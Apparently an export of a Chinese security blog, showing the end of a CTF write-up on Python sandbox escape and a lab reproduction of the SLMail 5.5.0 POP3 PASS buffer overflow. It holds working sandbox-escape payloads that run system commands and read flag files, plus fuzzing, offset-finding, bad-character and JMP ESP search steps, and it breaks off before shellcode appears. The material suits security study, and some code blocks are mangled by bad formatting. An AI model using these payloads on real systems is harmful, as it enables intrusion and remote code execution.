<p><code>print ().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440660.03.png" alt></p>
</li>
</ol>
<h3 id="实例三"><a href="#实例三" class="headerlink" title="实例三"></a>实例三</h3><ol>
<li><p>实验环境代码如下：（这里用Python3写的，与前两个相比，这里先删除了两个危险的函数，然后对其他许多函数做了过滤，还对一些字符，如’.’都进行了过滤）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys, cmd, os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"> </span><br><span class="line">intro= <span class="string">"""</span></span><br><span class="line"><span class="string">   pwnhubcuit</span></span><br><span class="line"><span class="string">   pwneverything</span></span><br><span class="line"><span class="string">   Rules:</span></span><br><span class="line"><span class="string">        -No import</span></span><br><span class="line"><span class="string">        -No ...</span></span><br><span class="line"><span class="string">        -No flag</span></span><br><span class="line"><span class="string"> """</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(command)</span>:</span></span><br><span class="line">    exec(command, globals())</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jail</span><span class="params">(cmd.Cmd)</span>:</span></span><br><span class="line">    prompt    = <span class="string">'&gt;&gt;&gt; '</span></span><br><span class="line">    filtered   =<span class="string">'\'|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back'</span>.split(<span class="string">'|'</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_EOF</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        sys.exit()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">emptyline</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> cmd.Cmd.emptyline(self)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">default</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        sys.stdout.write(<span class="string">'\x00'</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">postcmd</span><span class="params">(self, stop, line)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> any(f <span class="keyword">in</span> line <span class="keyword">for</span> f <span class="keyword">in</span> self.filtered):</span><br><span class="line">            print(<span class="string">"You are a big hacker!!!"</span>)</span><br><span class="line">            print(<span class="string">"Go away"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                execute(line)</span><br><span class="line">            <span class="keyword">except</span> NameError:</span><br><span class="line">                print(<span class="string">"NameError: name'%s' is not defined"</span> % line)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                print(<span class="string">"Error: %s"</span> %line)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> cmd.Cmd.postcmd(self, stop,line)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        Jail().cmdloop(intro)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"\rSee you next time!"</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>所以这里就没有办法使用前面说的利用子类进行系统的调用，这里通过获取系统函数地址进行绕过：</p>
<p><code>print(getattr(os, &quot;system&quot;)(&quot;ls&quot;))</code></p>
<p><code>print(getattr(os, &quot;system&quot;)(&quot;cat flag&quot;))</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525442349.25.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525442706.14.png" alt></p>
</li>
</ol>
<blockquote>
<p>以上三个实例就是利用Python作为脚本语言的特性来逃逸</p>
</blockquote>
<h3 id="实例四"><a href="#实例四" class="headerlink" title="实例四"></a>实例四</h3><blockquote>
<p>拿最近一次比赛中的沙盒逃逸来演示一下。</p>
</blockquote>
<ol>
<li><p>拿到赛题以后nc连接一下并输入一些语句进行测试：（也是许多函数被限制且不回显，经过测试发现是Python2写的环境并且没有过滤‘ . ’）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443353.83.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443493.14.png" alt></p>
</li>
<li><p>这里和我们前面的练习不一样，这里必须要调用系统命令ls来看一下存放flag的文件，找到一个和getattr函数类似的函数getattribute</p>
<p><code>print ().__class__.__bases__[0].__getattribute__(&#39;o&#39;+&#39;s&#39;,&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;)</code>  发现可以使用单引号调用参数</p>
<p><code>().__class__.__bases__[0].__getattribute__(__import__(&#39;o&#39;+&#39;s&#39;),&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;)</code> 构造第二个payload，尝试使用导入os模块的方法调用系统命令，结果失败，过滤了os:<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443785.45.png" alt></p>
<p>这个时候我们换一下思路，调用子类中的函数catch_warnings，在第59个，构造paylad:</p>
<p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s&#39;).read</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525444594.33.png" alt></p>
<p>成功列出了目录，经过测试flag在home/ctf目录下：</p>
<p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s /home&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525445718.2.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525445847.25.png" alt></p>
<p>然后我们加上getattribute构造payload：</p>
<p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;c&#39;&#39;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#39;).read()</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525446030.23.png" alt></p>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>利用语言特性来进行解释器的逃逸，其实就是绕过python沙盒内部导入模块的白名单；这里我理解为它限制的是语言中最直接的模块、函数的调用，而我们利用的是通过封装的类，以及派生出的子类调用，实现相同的功能。还有不得不说的一点，结合生产环境，通过内存破坏、溢出等方式实现沙盒的的逃逸要理解很多东西，涉及到二进制、fuzzy等等，所以要通过不断的学习才可以综合的利用。由于水平有限，这里只能做到语言解释器的沙盒逃逸，而不是系统层面的。下面给出一个讲利用内存破坏实现Python沙盒逃逸的链接。</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>CTF</tag>
        <tag>沙盒逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>一次windows缓冲区溢出复现</title>
    <url>/2018/06/09/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<blockquote>
<p>缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。</p>
</blockquote>
<h2 id="程序的漏洞从哪里来："><a href="#程序的漏洞从哪里来：" class="headerlink" title="程序的漏洞从哪里来："></a>程序的漏洞从哪里来：</h2><ul>
<li>罪恶的根源：变量</li>
<li>数据与代码边界不清（程序没有严格的限定）</li>
<li>由于控制不严会造成程序被严重的破坏</li>
<li>最简单漏洞原理——shell脚本</li>
</ul>
<ol>
<li><p>通过一个最简单的shell脚本来体现漏洞的由来：</p>
<ul>
<li><p>这个脚本本意是将用户输入的字符显示出来，从程序的目的来看没有问题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> $</span><br></pre></td></tr></table></figure>
</li>
<li><p>但是这个程序没有做数据和命令上的过滤，通过一些特殊字符的构造就可以执行命令（比如； &amp;&amp; ||）</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-20/39703071.jpg" alt></p>
</li>
<li><p>上面的结果就是一个简单的漏洞产生的原理，假如说这是一个服务器，攻击者就可以使用nc开一个监听端口，然后将shell重定向，这样就会直接控制服务器</p>
</li>
</ul>
</li>
<li><p>缓冲区溢出：</p>
<ul>
<li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据。</li>
<li>成功修改内存数据、可以造成进程劫持、执行恶意代码、获得服务器权限等后果。</li>
</ul>
</li>
</ol>
<h2 id="如何发现漏洞："><a href="#如何发现漏洞：" class="headerlink" title="如何发现漏洞："></a>如何发现漏洞：</h2><ul>
<li>源码审计（首先你得能接触到源码）</li>
<li>逆向工程</li>
<li>模糊测试<ul>
<li>向程序堆栈发送随机、半随机的数据，根据存在内存变化判断溢出  （完全随机的不好判断）</li>
<li>数据生成器：生成随机、半随机的数据  （工具）</li>
<li>测试工具：识别溢出漏洞                        （工具，主要使用一些动态调试工具）</li>
</ul>
</li>
</ul>
<h2 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h2><ul>
<li>FUZZER<ul>
<li>SLMail 5.5.0 Mail Server      （一个Windows下的存在缓冲区溢出的服务端）</li>
<li>ImmunityDebugger_1_85setup.exe    （一个调试工具，比OD的自动化程度高一些）</li>
<li>mona.py                                              （辅助脚本）</li>
<li>环境：Windows XP（需要将SLMail 、调试工具部署好）<ul>
<li>安装SLMail按照提示安装完查看端口、服务（smtp、pop3等）是否开放</li>
<li>安装调试工具，如果没有Python2.7环境它会自动安装</li>
<li>将mono.py放在ImmunityDebugger的Pycommands文件夹中</li>
</ul>
</li>
<li>SLMail 5.5.0 Mail Server<ul>
<li>pop3  pass命令存在缓冲区溢出漏洞</li>
<li>无需身份验证实现远程代码执行</li>
<li>DEP：阻止代码从数据页被执行      （Windows的一种安全防护机制）</li>
<li>ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化 （Windows的一种安全防护机制）</li>
</ul>
</li>
</ul>
</li>
<li><p>pop3</p>
<ul>
<li><p>最简单的 <figure class="highlight"><figcaption><span>110端口```</span></figcaption><table><tr><td class="code"><pre><span class="line">- 了解未知协议</span><br><span class="line">  - wireshark</span><br><span class="line"></span><br><span class="line">  - RFC</span><br><span class="line"></span><br><span class="line">  - 通过一个简单的Python脚本进行110端口的连接：</span><br><span class="line"></span><br><span class="line">    ```pytho<span class="symbol">n</span></span><br><span class="line">    #!/usr/bin/python</span><br><span class="line">    import socket</span><br><span class="line"> </span><br><span class="line">    s = socket.socket<span class="comment">(socket.AF_INET,socket.SOCK_STREAM)</span></span><br><span class="line">    try:</span><br><span class="line">        print "\nSending evil buffer..."</span><br><span class="line">        s.connect(('192.168.111.137',110))</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.send('USER admin' + '\r\n')</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.send('PASS admin\r\n')</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.close<span class="comment">()</span></span><br><span class="line">        print "\nDone!"</span><br><span class="line">    except:</span><br><span class="line">        print "Could not connect to POP3!"</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>这里已知SLMail 5.5.0的pass存在缓冲区溢出漏洞，在实际测试用就需要一步步调试</p>
<ul>
<li><p>测试pass命令接收到大量数据时是否合法</p>
</li>
<li><p>EIP寄存器存放下一条指令的地址</p>
</li>
<li><p>2.py （通过一个简单的Python脚本来验证SLMail 5.5.0的pass命令存在存在缓冲区漏洞）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">buffer = [<span class="string">"A"</span>]</span><br><span class="line">counter = <span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer) &lt;= <span class="number">50</span>:</span><br><span class="line">    buffer.append(<span class="string">"A"</span>*counter)</span><br><span class="line">    counter = counter + <span class="number">200</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes "</span> % len(string)</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect = s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">"USER test"</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + string + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">    s.close()</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#向目标的110端口发送大量的A</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>首先确保开启了pop3：<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/49054008.jpg" alt></p>
</li>
<li><p>打开ImmunityDebugger并且开始调试pop3服务的这个进程，查看端口状态的时候可以看到PID是2696<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/51147695.jpg" alt><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/87550059.jpg" alt></p>
</li>
<li><p>准备就绪以后启动脚本发送数据：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/83362379.jpg" alt></p>
</li>
<li><p>当数据到2700bytes的时候会发现EIP EBP寄存器都是4141 assic码就是A，这个时候发送大量的A造成了PASS指定的溢出，证明溢出确实存在：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/89254562.jpg" alt></p>
</li>
<li><p>溢出存在，如果EIP指令可以修改，就可以通过一些构造，就可能执行一些系统命令；还有一种可能，通过修改EIP的地址，将指令指向一个内存地址空间，通过缓冲区溢出添加shellcode，然后控制服务器。</p>
</li>
</ul>
</li>
<li><p>通过PASS缓冲区溢出漏洞的验证，发现在数据发送到2900bytes的时候溢出</p>
<ul>
<li><p>通过第三个脚本精确的找到溢出的四个字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2700</span>     <span class="comment">#因为前面是从2700开始溢出的</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2600</span>     <span class="comment">#改为2800确定是否在 2800-2900之间</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>现在再看POP3的进程，仅管还是溢出了，但是EIP不是全A的状态了，就证明精确溢出的四个字节在2600-2700：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65934922.jpg" alt></p>
</li>
<li><p>更加精确定位</p>
<ul>
<li><p>二分法</p>
</li>
<li><p>唯一字符串法：如果可以生成唯一的字符串，就可以精确定位是那四个字节填充了EIP</p>
<ul>
<li><p>通过一个脚本生成</p>
<figure class="highlight plain"><figcaption><span>/usr/share/metasploit-framework/tools/exploit/```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ```udo ./pattern_create.rb -l 2700``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/17607469.jpg)</span><br><span class="line"></span><br><span class="line">- 将生成的2700字符串替换上个脚本中的2700个A，然后重新测试，得到如下结果：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65730627.jpg)</span><br><span class="line"></span><br><span class="line">- EIP中的四个字节的HEX为：39 69 44 38  由于计算机中内存的分配和人的阅读习惯刚好相反 ：38 44 69 39；对应的ASSIC为：8Di9</span><br><span class="line"></span><br><span class="line">- 使用脚本查看着四个字节的偏移量：</span><br><span class="line"></span><br><span class="line">  ```sudo ./pattern_offset.rb -q 39694438``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/50197101.jpg)</span><br><span class="line"></span><br><span class="line">- 然后修改前面的脚本，将偏移量2606的字符串设置为A，然后溢出的四个字节设置为B，其余的设置为C，这样确定精确查找是否正确：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  #!/usr/bin/python</span><br><span class="line">  import socket</span><br><span class="line"> </span><br><span class="line">  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  buffer = &apos;A&apos; * 2606 + &apos;B&apos; * 4 + &apos;C&apos; * 80</span><br><span class="line">  try:</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">  except:</span><br><span class="line">      print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
<p><img src="C:\Users\ADMINI~1\AppData\Local\Temp\1521642331693.png" alt="52164233169"></p>
</li>
<li><p>通过查看EIP的数据：42424242 刚好是4个B，证明前面测试出的偏移量2606是正确的。这里就可以确定我们可以利用这里的精确修改EIP中的指定达到利用PASS缓冲区溢出的漏洞。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>现在已经可以精确修改寄存器中的内容，被修改的寄存器有EIP（重点关注）、EBP、ESP；接下来的思路：将EIP修改为shellcode代码的内存地址，将shellcode写入该地址空间（ESP），程序读取EIP寄存器中的数值，然后跳转到shellcode代码段并执行</p>
<ul>
<li><p>寻找可存放shellcode的内存空间</p>
</li>
<li><p>通过脚本来探测ESP寄存器的大小：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2606</span> + <span class="string">'B'</span> * <span class="number">4</span> + <span class="string">'C'</span> * <span class="number">890</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span>![](http://demos-qq.oss-cn-beijing.aliyuncs.com/<span class="number">18</span><span class="number">-3</span><span class="number">-22</span>/<span class="number">9248235.j</span>pg)</span><br></pre></td></tr></table></figure>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/9248235.jpg" alt></p>
</li>
<li><p>然后查看esp中C的结束地址：（通过计算可以得出esp的空间大小为四百多，可以放下一个shellcode）<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/79008411.jpg" alt></p>
</li>
<li><p>由于不同类型的程序、协议、漏洞、会认为一些字符是坏字符，这些字符有固定用途</p>
<ul>
<li><p>返回地址、shellcode、buffer都不能出现坏字符</p>
</li>
<li><p>null byte (0x00) 空字符、用于终止字符串的拷贝操作</p>
</li>
<li><p>return （0x0D）回车操作，表示POP3 PASS命令输入完成</p>
</li>
<li><p>思路：发送0x00——0xff 256个字符，查找所有坏字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars = (</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0b\x0c\x0d\x0e\x0f\x00"</span></span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"</span></span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\4e\x4f\x40"</span></span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"</span></span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"</span></span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"</span></span><br><span class="line"><span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"</span></span><br><span class="line"><span class="string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"</span></span><br><span class="line"><span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"</span></span><br><span class="line"><span class="string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"</span></span><br><span class="line"><span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"</span></span><br><span class="line"><span class="string">"\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"</span></span><br><span class="line">)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2606</span> + <span class="string">'B'</span> * <span class="number">4</span> + badchars</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21611430.jpg" alt></p>
</li>
<li><p>这里我们可以发现ESP寄存器中没有内容了，然后follow in dump 查看具体位置，发现数据一直到0A的时候就异常了，然后修改脚本，删去0A，通过这种方法找到三个坏字符：0A 0D 00</p>
</li>
</ul>
</li>
<li><p>理论上这个时候就可以进行数据的重定项了，将EIP的内容改为ESP的地址，但实际上是ESP的地址是变化的，所以这样就没有办法做重定向，硬编码不可行，这里就需要变通思路：</p>
<ul>
<li><p>在内存中寻找地址固定的系统模块</p>
</li>
<li><p>在模块中寻找JMP ESP（内存地址固定不变）指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode</p>
</li>
<li><p>mono.py脚本识别内存模块，搜索return address 是JMP ESP指令的模块</p>
</li>
<li><p>寻找无DEP、ALSR保护的内存地址</p>
</li>
<li><p>内存地址不含坏字符</p>
</li>
<li><p>配置好调试工具，启动mono脚本：<figure class="highlight plain"><figcaption><span>modules```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/86872565.jpg)</span><br><span class="line"></span><br><span class="line">  我们可以发现系统正在运行的模块都出现了，那么如何找到合适的模块呢，先介绍一下上面的参数</span><br><span class="line"></span><br><span class="line">  rebase（操作系统重启以后是否发生变化，如变化，则为true，否则为false）这里寻找false的</span><br><span class="line"></span><br><span class="line">  safeseh aslr nxcompat 是操作系统的安全机制，都选false,true的是带有保护机制的，内存地址都是随机的。</span><br><span class="line"></span><br><span class="line">  OS dll表示每个操作系统都有的这里都选为TRUE</span><br><span class="line"></span><br><span class="line">- 由于计算机内存中存储的是二进制，汇编指令肯定是无法查找的，所以通过工具将汇编指令转换成二进制：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/17531204.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们进行jmp esp的查找，由于调试工具数据是十六进制，所以需要以十六进制的形式进行查找：```! mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</span><br></pre></td></tr></table></figure></p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/28063784.jpg" alt></p>
</li>
